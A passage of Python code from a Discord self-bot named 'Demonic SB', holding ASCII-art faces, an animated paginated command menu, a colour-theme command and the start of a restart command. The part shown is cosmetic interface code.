⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁
⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀
⠸⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
⠀⢹⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀
⠀⠀⠹⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⠀⠀⠀⠙⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠛⠛⠛⠛⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                
                
                
                
                
"""
),
  "tokyo": ("""
              
              ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢰⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⠠⠀⠀⡇⣯⡄⢀⢀⢰⠢⡀⢣⠘⡄⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⢂⠑⡀⡇⢿⠐⡈⠪⠄⣧⣐⣄⠿⡱⢄⠀⢺⠤⢀⢰⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⣀⠀⠑⢦⡤⢤⣥⡬⢧⠼⢧⠬⠯⡙⣷⣖⠧⡙⣒⣧⠵⣀⠩⣢⢿⣌⢓⢄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢄⠳⡌⠙⠡⣍⡓⠦⣌⠭⢬⣤⣡⠐⢎⢼⠷⢞⣼⣬⣱⣽⣲⢫⢻⢕⣍⠣⡱⡽⡲⡠⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⢕⡢⢈⠣⡾⢌⡃⠠⢘⣧⣋⠙⠦⡭⢭⡝⠶⣳⠷⢮⣽⣶⣷⣭⣹⢷⡷⣿⣯⣷⡨⢶⣿⣵⢌⡦⡀⠀⠀
⠀⠀⠀⠀⠀⢀⢈⠢⣹⣢⣨⠖⢍⡒⠶⠨⣡⣒⣷⣶⣭⡗⣚⠚⡭⠝⠴⠦⣤⠍⣛⣓⢯⣬⣿⣽⣽⡿⣿⣿⣮⣾⡽⢷⣲⢱⡀⢀
⠀⠀⠀⠀⠀⠈⢋⢼⢽⢯⢦⡙⣓⠞⡛⣳⣙⣾⣭⣧⣄⣀⠤⠐⠒⠉⠊⠙⢛⣿⣟⣯⣾⣭⣻⣮⣻⣿⣿⣿⣿⣿⣦⠘⣞⡌⡿⣼
⠀⠀⠀⠀⠀⠀⠀⣱⢻⡔⢤⣉⣐⣤⣋⣥⡤⣽⡷⠒⠌⡀⢀⣠⡤⠚⢈⣉⡴⠯⠛⠻⢃⢛⣻⣿⣷⣿⣿⡿⣿⣿⣿⣧⣿⣶⣲⢻
⠀⠀⠀⠀⠀⠀⠀⠀⠑⠺⢅⣝⣛⣥⣍⡁⢀⣉⣠⣴⠞⣋⣽⠡⢴⠾⣋⡡⢄⣲⣈⠭⠙⠛⣻⣿⣿⣷⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠒⡤⢤⢶⠚⣋⡩⢤⣖⣍⣉⣾⢋⣬⣛⣷⡿⠋⣨⣕⣦⠓⠁⠀⣀⠴⢎⣉⠵⢛⣻⣩⣽⣿⣿⣿⣿⣿⣿⣋⣟
⠀⠀⠀⠀⠀⠀⠀⠀⣴⣙⡽⣯⡝⣋⣡⣴⣤⢿⢡⣿⣿⡿⢊⣤⠾⠋⡩⠂⢀⣴⡫⠕⣊⠕⢁⠔⢁⡼⠋⠁⡁⣸⣿⣿⣿⣿⣛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⡇⠀⠀⠀⢠⡀⢸⡻⡴⣷⣩⡟⠩⡠⢊⡠⣰⠟⢁⠄⠊⢀⡴⠋⠔⠉⠀⡘⢰⢀⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⢠⡄⠀⠀⡘⢩⠗⢪⢋⡟⣐⠥⠶⣹⠼⠑⢈⣀⣴⠜⢁⠀⠀⢠⡕⣽⠀⣟⣾⣿⢻⢻⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠚⡁⠋⠀⠠⡦⠢⠴⢥⣎⣜⣡⣶⣾⣶⣾⣿⣭⣽⣠⠴⢃⣔⣪⡞⣱⣷⠸⣼⣟⣧⣟⣼⣟⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⣷⡀⠀⠀⠀⣧⢠⡔⢋⣡⣾⣿⣿⢻⡏⠛⢻⣿⡟⢁⣴⣫⢻⣿⣲⣿⣾⡀⣷⣛⡟⣬⣿⢹⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⣛⠻⢿⣦⠀⠀⠈⠈⢡⡜⣿⡿⠟⡿⠃⠀⣄⢳⣿⡿⣿⢿⡿⣿⣽⣿⣿⡿⣧⣿⣿⣷⣿⠛⢸⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣡⠻⡷⣦⡿⠆⠀⠀⢠⣦⠀⢸⡅⠰⠃⠘⣦⡾⣧⡏⡄⢣⡄⣀⣿⣛⣬⡅⣶⣿⣿⣿⣿⢹⡄⣻⣿⣯⣿
⠀⠀⠀⠀⠀⠀⠀⠀⡠⠃⠀⢧⠀⣳⡀⠀⢠⣾⡿⠆⢈⣣⠀⠀⠀⡞⠃⠻⢀⠀⢾⣧⣉⣛⣉⣤⣶⣿⡟⠸⡌⢾⠀⣣⣿⡏⢫⡿
⠀⠀⠀⠀⠀⠀⠀⣾⣀⠀⠀⠙⠃⠘⠃⠠⣼⡇⠀⠀⢨⡖⠀⠀⠀⠁⠀⠀⠈⠁⠈⠻⢿⣿⣿⣿⠟⡹⠶⠁⡓⡘⣆⠿⠡⢠⡏⡿
⠀⠀⠀⠀⠀⠀⠀⠈⠺⢗⣦⣄⣀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠤⠀⠀⠀⠀⣫⣿⣿⣿⠀⢧⢸⠀⡿⢰⢣⢸⡇⡜⣸⣼
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢮⣿⡟⡿⣿⡿⣿⡿⣿⠿⢻⡿⠟⢉⠀⠔⠁⠀⠀⠀⢿⣹⡟⣿⡄⣽⣿⢃⢣⢸⣮⢿⢼⢡⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣧⣵⣾⣾⣿⠿⢻⠇⢀⠔⠁⠀⡜⠐⠀⠄⢐⣿⣎⣿⡹⢷⡄⣿⣿⣼⢿⡟⢹⢀⣡⡽⣽
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⣠⡾⢁⣴⣏⡠⠊⠀⡠⠊⠀⠀⣄⣀⣼⣇⠫⢢⡧⢘⣧⡽⣬⢷⡞⡷⡠⢳⢾⠣⡼
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠖⠁⠀⢀⠟⡹⠋⠁⣴⠁⠀⠀⠀⣸⡟⠀⢦⣁⣬⢡⠷⣫⢵⡘⠸⠇⡷⠯⡍⠸⡔⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⡄⠀⠀⣼⣚⣁⣀⣞⣉⣀⣀⣴⣯⣾⣧⣴⣾⣿⣿⠊⠀⠈⠃⠹⠃⠀⠣⠀⠀⠀⢷⠤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀
⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀

"""
  )
  
  
  

}

 
    
# Initialize the default face

current_face = "face1"





loading_bar = [
    "░░░░░░░░░░", "█░░░░░░░░░", "██░░░░░░░░", "███░░░░░░░",
    "████░░░░░░", "█████░░░░░", "██████░░░░", "███████░░░",
    "████████░░", "█████████░", "██████████"
]

def format_menu_message(commands_list, page, total_pages, total_commands, start, username, face):
    menu_message = f"{ansi_color}{face}{ansi_reset}\n"
    menu_message += f"[{ansi_color}Demonic SB{ansi_reset}]\n"
    menu_message += f"[{ansi_color}Page {page}/{total_pages}{ansi_reset}]\n"
    menu_message += f"[{ansi_color}Total Commands: {total_commands}{ansi_reset}]\n\n"
    
    for i, cmd in enumerate(commands_list, start=start + 1):
        menu_message += f"[ {ansi_color}{str(i).zfill(2)}{ansi_reset} ] {cmd.qualified_name}\n"
    
    menu_message += (
        f"\n  {ansi_color}  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗\n"
        f"    ║                   Dev: @59hn(voz)      Hello There! {username}   Demonic Self Bot  (By voz)   ║\n"
        f"    ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝{ansi_reset}\n"
    )
    
    return menu_message

@bot.command()
async def menu(ctx, page: int = 1):
    commands_list = sorted([cmd for cmd in bot.commands if not cmd.hidden], key=lambda cmd: cmd.qualified_name.lower())
    commands_per_page = 20
    total_commands = len(commands_list)
    total_pages = math.ceil(total_commands / commands_per_page)

    if page < 1 or page > total_pages:
        return

    start = (page - 1) * commands_per_page
    end = start + commands_per_page
    page_commands = commands_list[start:end]

    username = ctx.author.name  # Get the username of the command invoker

    if page == 1:  # Only show loading animation on first page
        loading_msg = await ctx.send(f"```ansi\n{ansi_color}\n[░░░░░░░░░░] Loading...\n```")

        # Simulate loading bar animation
        for step in loading_bar:
            await asyncio.sleep(0.3)
            await loading_msg.edit(content=f"```ansi\n{ansi_color}\n[{step}] Loading...\n```")
        
        # Animate face change for 3 seconds after loading
        animation_faces = list(faces.values())
        for _ in range(10):  # Runs for approximately 3 seconds
            random_face = random.choice(animation_faces)
            menu_message = format_menu_message(page_commands, page, total_pages, total_commands, start, username, random_face)
            await asyncio.sleep(0.3)
            await loading_msg.edit(content=f"```ansi\n{ansi_color}\n{menu_message}\n```")
        
        # Randomly select final face
        final_face = random.choice(animation_faces)
        final_menu_message = format_menu_message(page_commands, page, total_pages, total_commands, start, username, final_face)
        await loading_msg.edit(content=f"```ansi\n{final_menu_message}\n```", delete_after=60)
    else:
        # Instantly display menu without animation for other pages
        final_face = random.choice(list(faces.values()))
        final_menu_message = format_menu_message(page_commands, page, total_pages, total_commands, start, username, final_face)
        await ctx.send(f"```ansi\n{final_menu_message}\n```", delete_after=60)


@bot.command(help="Themes: red, green, yellow, blue, magenta, cyan, white")
@require_password()
async def theme(ctx, color: str = None):
    global ansi_color
    color_codes = {
        "red": '\u001b[31m',
        "green": '\u001b[32m',
        "yellow": '\u001b[33m',
        "blue": '\u001b[34m',
        "magenta": '\u001b[35m',
        "cyan": '\u001b[36m',
        "white": '\u001b[37m',
        
    }

    if color is None or color.lower() not in color_codes:
        await ctx.send("```~ red, green, yellow, blue, magenta, cyan, white```", delete_after=10)
        return

    ansi_color = color_codes[color.lower()]
    await ctx.send(f"```~ Theme color has been changed to {color.capitalize()}!```", delete_after=10)
    

import os
import sys

import asyncio

@bot.command(name='restart')
@require_password()
async def restart(ctx):
    # Define the initial ASCII art to display before restart
    restart_ascii = """ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀       ⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀    ⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⣴⣿⣿⣿⣿⡿⠁⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣷⣿⣿⣿⣿⣿⠁⠀⠀⠀⢨⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣾⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⢀⣼⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡄⠀⠀⠀⠀⠋⠉⠉⠙⠛⠿⠟⠻⠿⠿⠿⠿⠷⣤⣀⠀⠀⢀⠴⠟⠛⠛⠛⠋⠉⠁⠉⠁⠀⠀⠀⠀⠀⠀⣼⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢰⣄⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣧⣀⣀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⣿⣿⣸⣿⣿⣿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⢸⣿⣦⣦⣄⡀⠀⢠⣶⢰⣦⣶⣰⣆⣶⣰⣦⣄⢰⣴⡄⣴⠀⠀⣦⣷⣿⣿⣿⣿⣯⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⡿⣿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⢹⠘⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⡟⢹⣿⣿⣿⣿⣿⣿⠹⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠈⠟⠏⢿⢿⢿⢧⠘⣿⢿⣿⡟⠿⡇⠸⣿⠿⢻⡟⠛⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠘⠀⠀⠈⠈⠁⠀⠁⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀
    """
    
    # Send the initial message saying that the bot is restarting
    restart_message = await ctx.send(f"```ansi\n{ansi_color}{restart_ascii}\nRestarting the self-bot...{ansi_color}\n```")
    
    # Add a delay of 2 seconds before editing the message
    await asyncio.sleep(2)
    
    # Define the ASCII art to display after restart
    restarted_ascii = """ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣶⣶⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠟⠛⢿⣶⡄⠀⢀⣀⣤⣤⣦⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⠋⠀⠀⠈⠙⠻⢿⣶⣶⣶⣶⣶⣶⣶⣿⠟⠀⠀⠀⠀⠹⣿⡿⠟⠋⠉⠁⠈⢻⣷⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⡧⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⣾⡏⠀⠀⢠⣾⢶⣶⣽⣷⣄⡀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⢸⣧⣾⠟⠉⠉⠙⢿⣿⠿⠿⠿⣿⣇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣄⣀⣠⣼⣿⠀⠀⠀⠀⣸⣿⣦⡀⠀⠈⣿⡄⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠻⣷⣤⣤⣶⣿⣧⣿⠃⠀⣰⣿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⣿⣀⠀⠀⣀⣴⣿⣧⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠉⢸⣿⠀⠀⠀⠀
⢀⣠⣤⣤⣼⣿⣤⣄⠀⠀⠀⡶⠟⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣶⡄⠀⠀⠀⠀⢀⣀⣿⣄⣀⠀⠀
⠀⠉⠉⠉⢹⣿⣩⣿⠿⠿⣶⡄⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⣤⡀⠀⠀⠀⠀⠀⠿⡿⠃⠀⠀⠀⠘⠛⠛⣿⠋⠉⠙⠃
⠀⠀⠀⣤⣼⣿⣿⡇⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀⠘⠿⣤⡼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣼⣿⣀⠀⠀⠀
⠀⠀⣾⡏⠀⠈⠙⢧⠀⠀⠀⢿⣧⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠟⠙⠛⠓⠀
⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠻⣷⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣶⣿⣯⡀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⣷⣄⠀⠀⠀⢀⣴⠿⠿⠗⠈⢻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⠟⠋⠉⠛⠷⠄⠀⠀
⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⢿⣇⠀⢀⣠⡄⢘⣿⣶⣶⣤⣤⣤⣤⣀⣤⣤⣤⣤⣶⣶⡿⠿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣿⡄⠀⠀⠈⠛⠛⠛⠋⠁⣼⡟⠈⠻⣿⣿⣿⣿⡿⠛⠛⢿⣿⣿⣿⣡⣾⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀
